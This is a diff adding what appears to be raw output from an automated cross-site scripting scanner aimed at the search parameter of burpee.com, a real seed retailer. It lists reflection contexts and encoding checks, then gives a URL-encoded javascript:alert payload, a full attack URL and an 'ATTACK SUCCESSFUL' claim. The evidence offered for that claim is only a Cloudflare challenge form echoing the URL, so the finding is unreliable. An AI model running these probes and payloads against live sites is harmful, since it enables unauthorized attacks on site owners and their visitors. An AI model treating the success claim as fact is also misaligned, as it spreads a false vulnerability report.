@@ -1,0 +1,68 @@
+https://www.burpee.com/vegetables/turnips/turnip-silky-sweet-hybrid--prod500775.html
+
+GET Params:[1]
+['q']
+_______________________________________________________________________________________________________
+https://www.burpee.com/search?q=(uvw"xyz'yxz</zxy
+
+----------------------------------------------------------------------------------
+Attribute Context: [0]
+
+----------------------------------------------------------------------------------
+HTML Context: [3]
+<title>Search Results=(uvw"xyz'yxz</zxy|Burpee Seeds and Plants</title>
+<a class="b-breadcrumbs-keywords_link" href="/search?q=%28uvw%22xyz%27yxz%3C%2Fzxy" title="(uvw&quot;xyz'yxz&lt;/zxy">(uvw&quot;xyz'yxz&lt;/zxy</a>
+<span class="b-no_hits-search_term">
+
+"&#40;uvw&quot;xyz&#39;yxz&lt;/zxy"
+
+</span>
+
+----------------------------------------------------------------------------------
+Script Context: [1]
+<script>
+	adobeCatalyst.data = {"params":{"q":"(uvw&quot;xyz&#39;yxz&lt;/zxy"},"pipeline":"Search-Show"};
+	adobeCatalyst.global = {"name":"","hierarchy":""};
+</script>
+
+----------------------------------------------------------------------------------
+URI Context: [2]
+<a class="b-breadcrumbs-keywords_link" href="/search?q=%28uvw%22xyz%27yxz%3C%2Fzxy" title="(uvw&quot;xyz'yxz&lt;/zxy">
+<meta property="og:title" content="Search Results=(uvw&quot;xyz'yxz&lt;/zxy|Burpee Seeds and Plants" />
+
+----------------------------------------------------------------------------------
+Same Attr : [0]
+
+----------------------------------------------------------------------------------
+Same HTML : [0]
+
+----------------------------------------------------------------------------------
+Same Script : [0]
+
+----------------------------------------------------------------------------------
+Same URI : [0]
+
+
+ENCODING     Presence	"	'	<	( 
+ATTR:		False	False	False	False	False
+ENCODING     Presence	"	'	<	( 
+HTML:		True	True	True	True	True
+
+Attack Payloads for HTML
+[]
+ENCODING     Presence	"	'	<	( 
+SCRIPT:		True	True	True	True	False
+
+Attack Payloads for SCRIPT
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	False	True	False
+
+Attack Payloads for URL
+['%3Ca+href%3D%22jaVaScripT%3AAleRt%281%29%22%3Eclick_XYZ%3C%2Fa%3E']
+
+URL Attack Url: https://www.burpee.com/search?q=%3Ca+href%3D%22jaVaScripT%3AAleRt%281%29%22%3Eclick_XYZ%3C%2Fa%3E
+
+=> ATTACK SUCCESSFUL with Payload: %3Ca+href%3D%22jaVaScripT%3AAleRt%281%29%22%3Eclick_XYZ%3C%2Fa%3E
+Detection of Payload: 
+<form class="challenge-form" id="challenge-form" action="/search?q=%3Ca+href%3D%22jaVaScripT%3AAleRt%281%29%22%3Eclick_XYZ%3C%2Fa%3E&amp;__cf_chl_captcha_tk__=aac12d888c40a3bd41e6b3d34394bafce22d8745-1586143026-0-ASB0D7vIZMIw2VJcd7LMz077_c-qg2N2kWLQZeru2C1Odi8ZDrXoH1OR7xGHoTQ8nxY-jVzUjywp42KGfQEjhg8GNgw1GjxoWRwj5hZkDPqJdXdHFv8q9G9zV269zkfHmV4y2fa7-Boqm-OnF2I0slS3rJNAa3ApV0WfhNR76i7ccawunR-1eamsNRwt2W7kNfkcVq85l7_ZIR5mziTc68LQbi4JtWitC3KvNsNPe7JPIVK3ic587mHd0y_VQWz2pQG4r4ZZqeCwg-f0PsUbghCddpg1IJ_WFCFsbazvfn2QMBJDmzSMDqEJfTUA81B3NQzTTwr5Sg1K2sTCPS5KBPHO4wK1_5NXROFukGI5jq1bsKD9HQG1mJeqUszEHaHZOdT8b07nk1i9CI9Lwx343h1-iY71gFXYJpvO491gTU-dfLLoboyGTzS1vc7SBRPLuBc2aPpcqqN7PsiQiKxAItizANHSKiavhAG6TvSgBZSSUkRdxmm5JHh9mbCQoGDSBPnwZoCMGV16oeOZDKxa94iOGvDfLIxD1Fye-6qYafWta8eM1tQKsWfbplw64Ks3PnbmXRY4svHETBD0V90OjH8" method="POST" enctype="application/x-www-form-urlencoded">
